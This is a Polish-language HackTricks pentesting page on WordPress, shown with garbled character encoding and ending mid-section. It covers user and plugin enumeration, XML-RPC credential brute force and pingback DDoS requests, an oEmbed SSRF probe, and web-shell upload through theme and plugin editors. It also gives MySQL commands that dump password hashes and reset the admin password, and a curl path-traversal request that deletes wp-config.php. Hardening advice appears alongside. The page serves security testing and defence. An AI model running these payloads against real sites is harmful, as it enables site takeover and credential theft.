# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **PrzesÅ‚ane** pliki znajdujÄ… siÄ™ pod adresem: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› plik php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie uÅ¼yjesz tej Å›cieÅ¼ki. Na przykÅ‚ad: UÅ¼ywajÄ…c **motywu twentytwelve** moÅ¼esz **uzyskaÄ‡ dostÄ™p** do pliku **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Inny przydatny adres URL to:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o gÅ‚Ã³wne do bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPressa**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak wersja zainstalowanego WordPressa.
- `wp-activate.php` jest uÅ¼ywany do procesu aktywacji e-maila podczas konfigurowania nowej witryny WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik, ktÃ³ry reprezentuje funkcjÄ™ WordPressa, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych za pomocÄ… HTTP jako mechanizmu transportowego i XML jako mechanizmu kodowania. Ten typ komunikacji zostaÅ‚ zastÄ…piony przez [REST API](https://developer.wordpress.org/rest-api/reference) WordPressa.
- Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
- `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszelkie pliki przesÅ‚ane na platformÄ™.
- `wp-includes/` To katalog, w ktÃ³rym przechowywane sÄ… pliki rdzeniowe, takie jak certyfikaty, czcionki, pliki JavaScript i widÅ¼ety.
- `wp-sitemap.xml` W wersjach WordPressa 5.5 i wyÅ¼szych, WordPress generuje plik XML mapy witryny ze wszystkimi publicznymi postami oraz publicznie zapytujÄ…cymi typami postÃ³w i taksonomiami.

**Post eksploatacja**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniajÄ…ce i sÃ³l oraz prefiks tabeli bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼ywany do aktywacji trybu DEBUG, co moÅ¼e byÄ‡ przydatne w rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Redaktor**: Publikuje i zarzÄ…dza swoimi i innymi postami
- **Autor**: Publikuje i zarzÄ…dza swoimi postami
- **WspÃ³Å‚autor**: Pisze i zarzÄ…dza swoimi postami, ale nie moÅ¼e ich publikowaÄ‡
- **Subskrybent**: PrzeglÄ…da posty i edytuje swÃ³j profil

## **Pasywna enumeracja**

### **Uzyskaj wersjÄ™ WordPressa**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ekstrakcja wersji w ogÃ³lnoÅ›ci
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich dostÄ™pnych Wtyczek i MotywÃ³w. Aby je wszystkie odkryÄ‡, bÄ™dziesz musiaÅ‚ **aktywnie przeprowadziÄ‡ Brute Force listy Wtyczek i MotywÃ³w** (na szczÄ™Å›cie sÄ… dostÄ™pne zautomatyzowane narzÄ™dzia, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

- **ID Brute:** Uzyskujesz waÅ¼nych uÅ¼ytkownikÃ³w z witryny WordPress, przeprowadzajÄ…c Brute Force na identyfikatorach uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi sÄ… **200** lub **30X**, oznacza to, Å¼e id jest **waÅ¼ne**. JeÅ›li odpowiedÅº to **400**, to id jest **niewaÅ¼ne**.

- **wp-json:** MoÅ¼esz takÅ¼e sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, wykonujÄ…c zapytanie:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Inny punkt koÅ„cowy `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten punkt koÅ„cowy ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone bÄ™dÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… wÅ‚Ä…czonÄ… tÄ™ funkcjÄ™**.

ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e **/wp-json/wp/v2/pages** moÅ¼e ujawniaÄ‡ adresy IP.

- **Enumaracja nazw uÅ¼ytkownikÃ³w logowania**: Podczas logowania w **`/wp-login.php`** **wiadomoÅ›Ä‡** jest **inna**, jeÅ›li wskazana **nazwa uÅ¼ytkownika istnieje lub nie**.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywne, moÅ¼esz przeprowadziÄ‡ atak brute-force na dane logowania lub uÅ¼yÄ‡ go do przeprowadzania atakÃ³w DoS na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces[ uÅ¼ywajÄ…c tego](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywne, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce poÅ›wiadczeÅ„**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re moÅ¼na wykorzystaÄ‡ do bruteforce poÅ›wiadczeÅ„. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
WiadomoÅ›Ä‡ _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ wewnÄ…trz odpowiedzi z kodem 200 powinna siÄ™ pojawiÄ‡, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c prawidÅ‚owych danych uwierzytelniajÄ…cych, moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
RÃ³wnieÅ¼ istnieje **szybszy sposÃ³b** na brutalne Å‚amanie haseÅ‚ za pomocÄ… **`system.multicall`**, poniewaÅ¼ moÅ¼esz sprÃ³bowaÄ‡ kilku haseÅ‚ w tym samym Å¼Ä…daniu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ObejÅ›cie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, a nie dla ludzi, i jest stara, dlatego nie obsÅ‚uguje 2FA. JeÅ›li masz waÅ¼ne dane logowania, ale gÅ‚Ã³wne wejÅ›cie jest chronione przez 2FA, **moÅ¼esz byÄ‡ w stanie wykorzystaÄ‡ xmlrpc.php do zalogowania siÄ™ z tymi danymi, omijajÄ…c 2FA**. ZauwaÅ¼, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich dziaÅ‚aÅ„, ktÃ³re moÅ¼esz wykonaÄ‡ przez konsolÄ™, ale nadal moÅ¼esz uzyskaÄ‡ dostÄ™p do RCE, jak wyjaÅ›nia to Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS lub skanowanie portÃ³w**

JeÅ›li moÅ¼esz znaleÅºÄ‡ metodÄ™ _**pingback.ping**_ na liÅ›cie, moÅ¼esz sprawiÄ‡, Å¼e Wordpress wyÅ›le dowolne Å¼Ä…danie do dowolnego hosta/portu.\
MoÅ¼na to wykorzystaÄ‡ do poproszenia **tysiÄ™cy** stron **Wordpress** o **dostÄ™p** do jednej **lokalizacji** (w ten sposÃ³b powodujÄ…c **DDoS** w tej lokalizacji) lub moÅ¼esz to wykorzystaÄ‡, aby **Wordpress** mÃ³gÅ‚ **zeskanowaÄ‡** jakÄ…Å› wewnÄ™trznÄ… **sieÄ‡** (moÅ¼esz wskazaÄ‡ dowolny port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** z wartoÅ›ciÄ… **wiÄ™kszÄ…** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak wykorzystaÄ‡ tÄ™ metodÄ™ do spowodowania DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zazwyczaj znajduje siÄ™ w katalogu gÅ‚Ã³wnym witryny Wordpress: **`/wp-cron.php`**\
Gdy ten plik jest **dostÄ™pny**, wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL, wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **spowodowania** **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym zaÅ‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da jakiejkolwiek strony Wordpress), co na stronach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego zadania cron na hoÅ›cie, ktÃ³re wykonuje potrzebne dziaÅ‚ania w regularnych odstÄ™pach czasu (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i witryna Wordpress moÅ¼e wysÅ‚aÄ‡ do Ciebie Å¼Ä…danie.

Oto odpowiedÅº, gdy to nie dziaÅ‚a:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy** istniejÄ…, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## NarzÄ™dzia automatyczne
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostÄ™p przez nadpisanie bitu

WiÄ™cej niÅ¼ prawdziwy atak, to ciekawostka. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku wordpress. MoÅ¼na wiÄ™c zmieniÄ‡ pozycjÄ™ `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zignorowaÄ‡ operacjÄ™ NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z uÅ¼ywanego motywu (wymagane dane logowania administratora)**

WyglÄ…d â†’ Edytor motywÃ³w â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na powÅ‚okÄ™ php:

![](<../../images/image (384).png>)

Szukaj w internecie, jak moÅ¼esz uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz uzyskaÄ‡ dostÄ™p tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¼liwe, Å¼e moÅ¼na przesÅ‚aÄ‡ pliki .php jako wtyczkÄ™.\
UtwÃ³rz swÃ³j backdoor w PHP, uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../images/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i naciÅ›nij Zainstaluj teraz:

![](<../../images/image (249).png>)

Kliknij na Kontynuuj:

![](<../../images/image (70).png>)

Prawdopodobnie to nic nie zrobi, ale jeÅ›li przejdziesz do MediÃ³w, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

Uzyskaj do niego dostÄ™p, a zobaczysz URL do wykonania reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na zainstalowaniu zÅ‚oÅ›liwej wtyczki, ktÃ³ra jest znana jako podatna i moÅ¼e byÄ‡ wykorzystana do uzyskania web shell. Proces ten odbywa siÄ™ przez pulpit WordPressa w nastÄ™pujÄ…cy sposÃ³b:

1. **Pozyskanie wtyczki**: Wtyczka jest pozyskiwana z ÅºrÃ³dÅ‚a takiego jak Exploit DB jak [**tutaj**](https://www.exploit-db.com/exploits/36374).
2. **Instalacja wtyczki**:
- PrzejdÅº do pulpitu WordPressa, a nastÄ™pnie do `Pulpit > Wtyczki > PrzeÅ›lij wtyczkÄ™`.
- PrzeÅ›lij plik zip pobranej wtyczki.
3. **Aktywacja wtyczki**: Po pomyÅ›lnej instalacji wtyczka musi byÄ‡ aktywowana przez pulpit.
4. **Eksploatacja**:
- Z wtyczkÄ… "reflex-gallery" zainstalowanÄ… i aktywowanÄ…, moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana jako podatna.
- Framework Metasploit zapewnia exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia, moÅ¼na nawiÄ…zaÄ‡ sesjÄ™ meterpreter, uzyskujÄ…c nieautoryzowany dostÄ™p do witryny.
- ZauwaÅ¼ono, Å¼e to tylko jedna z wielu metod eksploatacji witryny WordPress.

ZawartoÅ›Ä‡ obejmuje wizualne pomoce ilustrujÄ…ce kroki w pulpicie WordPressa dotyczÄ…ce instalacji i aktywacji wtyczki. WaÅ¼ne jest jednak, aby zauwaÅ¼yÄ‡, Å¼e eksploatacja podatnoÅ›ci w ten sposÃ³b jest nielegalna i nieetyczna bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie prawnym, takim jak testy penetracyjne z wyraÅºnym pozwoleniem.

**Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe kroki, sprawdÅº:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatnoÅ›ci **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatnoÅ›ci w WordPressie. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [**ten post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Oferuje **wsparcie dla wersji WordPressa 6.X.X, 5.X.X i 4.X.X oraz pozwala na:**
- _**Eskalacja uprawnieÅ„:**_ Tworzy uÅ¼ytkownika w WordPressie.
- _**(RCE) PrzesyÅ‚anie zÅ‚oÅ›liwej wtyczki (backdoor):**_ PrzeÅ›lij swojÄ… zÅ‚oÅ›liwÄ… wtyczkÄ™ (backdoor) do WordPressa.
- _**(RCE) Edycja wbudowanej wtyczki:**_ Edytuj wbudowane wtyczki w WordPressie.
- _**(RCE) Edycja wbudowanego motywu:**_ Edytuj wbudowane motywy w WordPressie.
- _**(Custom) ZÅ‚oÅ›liwe exploity:**_ ZÅ‚oÅ›liwe exploity dla wtyczek/motywÃ³w WordPressa innych firm.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

ZnajomoÅ›Ä‡ tego, jak wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa, aby znaleÅºÄ‡ luki w jej funkcjonalnoÅ›ci. MoÅ¼esz znaleÅºÄ‡, jak wtyczka moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡ w poniÅ¼szych punktach oraz kilka przykÅ‚adÃ³w podatnych wtyczek w [**tym wpisie na blogu**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e ujawniaÄ‡ funkcje, jest za poÅ›rednictwem handlerÃ³w AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy logiczne, autoryzacyjne lub uwierzytelniajÄ…ce. Co wiÄ™cej, czÄ™sto zdarza siÄ™, Å¼e te funkcje opierajÄ… zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu nonce Wordpress, ktÃ³ry **moÅ¼e mieÄ‡ kaÅ¼dy uÅ¼ytkownik uwierzytelniony w instancji Wordpress** (niezaleÅ¼nie od jego roli).

To sÄ… funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼ywane do ujawniania funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e punkt koÅ„cowy jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezautoryzowanych).**

> [!OSTRZEÅ»ENIE]
> Ponadto, jeÅ›li funkcja tylko sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, ta funkcja tylko sprawdza, czy uÅ¼ytkownik jest zalogowany, zazwyczaj nie sprawdza roli uÅ¼ytkownika. Tak wiÄ™c uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do dziaÅ‚aÅ„ o wysokich uprawnieniach.

- **REST API**

MoÅ¼liwe jest rÃ³wnieÅ¼ udostÄ™pnienie funkcji z WordPressa, rejestrujÄ…c REST AP za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` to funkcja zwrotna, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik ma uprawnienia do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼yta jest wbudowana funkcja `__return_true`, po prostu pominie sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku php**

OczywiÅ›cie, WordPress uÅ¼ywa PHP, a pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z sieci. Tak wiÄ™c, w przypadku, gdy wtyczka ujawnia jakÄ…kolwiek podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest wywoÅ‚ywana po prostu przez dostÄ™p do pliku, bÄ™dzie to wykorzystywalne przez kaÅ¼dego uÅ¼ytkownika.

### Nieautoryzowane usuwanie dowolnych plikÃ³w za pomocÄ… wp_ajax_nopriv (Motyw Litho <= 3.0)

Motywy i wtyczki WordPressa czÄ™sto ujawniajÄ… obsÅ‚ugiwacze AJAX za pomocÄ… hakÃ³w `wp_ajax_` i `wp_ajax_nopriv_`. Gdy uÅ¼ywana jest wariant **_nopriv_**, **funkcja zwrotna staje siÄ™ dostÄ™pna dla nieautoryzowanych odwiedzajÄ…cych**, wiÄ™c kaÅ¼da wraÅ¼liwa akcja musi dodatkowo implementowaÄ‡:

1. Sprawdzenie **uprawnieÅ„** (np. `current_user_can()` lub przynajmniej `is_user_logged_in()`), oraz
2. **CSRF nonce** weryfikowane za pomocÄ… `check_ajax_referer()` / `wp_verify_nonce()`, oraz
3. **ÅšcisÅ‚Ä… sanitacjÄ™ / walidacjÄ™ danych wejÅ›ciowych**.

Motyw wielofunkcyjny Litho (< 3.1) zapomniaÅ‚ o tych 3 kontrolach w funkcji *UsuÅ„ rodzinÄ™ czcionek* i ostatecznie dostarczyÅ‚ nastÄ™pujÄ…cy kod (uproszczony):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **Nieautoryzowany dostÄ™p** â€“ zarejestrowano hak `wp_ajax_nopriv_`.
* **Brak sprawdzenia nonce / uprawnieÅ„** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e uzyskaÄ‡ dostÄ™p do punktu koÅ„cowego.
* **Brak sanitizacji Å›cieÅ¼ki** â€“ ciÄ…g `fontfamily` kontrolowany przez uÅ¼ytkownika jest Å‚Ä…czony z Å›cieÅ¼kÄ… systemu plikÃ³w bez filtrowania, co pozwala na klasyczne przejÅ›cie `../../`.

#### Wykorzystanie

Napastnik moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej podstawowego katalogu przesyÅ‚ania** (zwykle `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c pojedyncze Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
PoniewaÅ¼ `wp-config.php` znajduje siÄ™ poza *uploads*, cztery sekwencje `../` sÄ… wystarczajÄ…ce w domyÅ›lnej instalacji. UsuniÄ™cie `wp-config.php` zmusza WordPress do *kreatora instalacji* przy nastÄ™pnej wizycie, co umoÅ¼liwia peÅ‚ne przejÄ™cie witryny (atakujÄ…cy jedynie podaje nowÄ… konfiguracjÄ™ DB i tworzy uÅ¼ytkownika administratora).

Inne istotne cele to pliki `.php` wtyczek/motywÃ³w (aby zÅ‚amaÄ‡ wtyczki zabezpieczajÄ…ce) lub reguÅ‚y `.htaccess`.

#### Lista kontrolna wykrywania

* KaÅ¼dy `add_action( 'wp_ajax_nopriv_...')` callback, ktÃ³ry wywoÅ‚uje pomocniki systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacja niesanitizowanego wejÅ›cia uÅ¼ytkownika w Å›cieÅ¼kach (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

#### Wzmacnianie
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Zawsze** traktuj kaÅ¼dÄ… operacjÄ™ zapisu/usuniÄ™cia na dysku jako uprzywilejowanÄ… i podwÃ³jnie sprawdÅº:
> â€¢ Uwierzytelnienie  â€¢ Autoryzacja  â€¢ Nonce  â€¢ Sanityzacja wejÅ›cia  â€¢ Ograniczenie Å›cieÅ¼ki (np. za pomocÄ… `realpath()` oraz `str_starts_with()`).

---

## Ochrona WordPressa

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº rÃ³wnieÅ¼, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
RÃ³wnieÅ¼, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczajÄ…ce

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne rekomendacje**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** uprawnienia uÅ¼ytkownikÃ³w
- **Ogranicz prÃ³by logowania**, aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwÃ³l na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.

### Nieautoryzowany SQL Injection przez niewystarczajÄ…cÄ… walidacjÄ™ (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal ujawniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod wewnÄ…trz `modules/category/model.php::validateFormData()`:
```php
